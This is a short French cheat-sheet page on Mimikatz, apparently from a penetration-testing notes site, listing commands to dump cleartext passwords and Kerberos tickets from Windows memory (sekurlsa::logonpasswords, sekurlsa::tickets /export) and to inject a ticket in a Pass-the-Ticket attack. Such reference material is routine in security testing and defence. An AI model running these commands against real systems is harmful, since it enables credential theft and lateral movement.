---
description: Mimikatz - Outil de Récupération de Mots de Passe Windows
---

# Mimikatz

`Description :`&#x20;

Mimikatz est un outil open source puissant qui permet de récupérer les mots de passe en clair, les tickets Kerberos, les clés de session et d'autres informations sensibles depuis la mémoire de systèmes Windows.

<mark style="color:yellow;">Exemples d'utilisation :</mark>

1. Récupérer les mots de passe en clair :&#x20;

* `mimikatz # privilege::debug`
* `mimikatz # sekurlsa::logonpasswords`

1. Exporter les tickets Kerberos : `mimikatz # sekurlsa::tickets /export`
2. Lancer un attaque Pass-the-Ticket (PtT) : `mimikatz # kerberos::ptt <chemin_du_fichier_ticket>`

<mark style="color:yellow;">Options Principales :</mark>

* `privilege::debug` : Obtenir les privilèges de débogage nécessaires pour accéder à certaines informations sensibles en mémoire.
* `sekurlsa::logonpasswords` : Récupérer les mots de passe en clair depuis la mémoire du système.
* `sekurlsa::tickets` : Afficher les tickets Kerberos présents en mémoire.
* `kerberos::ptt` : Injecter un ticket Kerberos pour lancer une attaque Pass-the-Ticket.
